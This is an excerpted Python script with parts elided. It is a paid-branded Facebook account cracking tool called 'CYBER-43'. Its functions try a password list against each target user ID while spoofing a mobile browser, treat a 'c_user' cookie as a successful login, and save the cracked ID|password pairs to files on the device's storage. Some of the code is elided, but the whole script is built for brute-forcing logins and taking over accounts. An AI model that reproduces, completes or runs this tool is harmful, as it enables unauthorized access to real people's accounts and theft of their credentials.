...
logo=("""
      ...
      \033[92;    _______     ______  ______ _____  

      \033[97;  / ____\ \   / /  _ \|  ____|  __ \ 
      ...
      \033[97;  \_____|  |_|  |____/|______|_|  \_\

\033[91;1m--------------------------------------------------

\033[97;1m>>     Owner    : ZIHAD ISLAM 

\033[97;1m>>     Facebook : ZIHAD ISLAM MEHEDI

\033[97;1m>>     Version  : 1.0

\033[97;1m>>     Git hop  : CYBER-31

\033[92;1m>>     Tol Typ  : CYBER-43 PAID
...
def fia():    
			...
			print('\x1b[97;1m>>> CYBER-31  VERSION :\x1b[1;92m 1.1 ')

			print('>>>Tol Typ : CYBER-43 PAID')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https:https://facebook.com/groups/258862096423615/');menu()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;31m[CYBER-43-CP] %s | %s'%(ids,pas))

				

				open('\x1b[91;1m/sdcard/CYBER-43-CP.txt', 'a').write(ids+'|'+pas+'\n')
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[1;92m[CYBER-43-OK] '+ids+' | '+pas+'\033[1;97m')

					

					open('/sdcard/CYBER-43-OK.txt', 'a').write(ids+'|'+pas+'\n')
...
def ffb(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m[CYBER-43] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[CYBER-43-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[38;5;208m[CYBER-43-CP] '+ids+' | '+pas+'\033[1;97m')

					

					open('/sdcard/CYBRR-43-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def fcrack(uid,pwx,tl):
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				print('\33[38;5;208m[CYBER-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				print('\x1b[1;92m[CYBER-OK] '+uid+' | '+ps+'\33[0;97m')
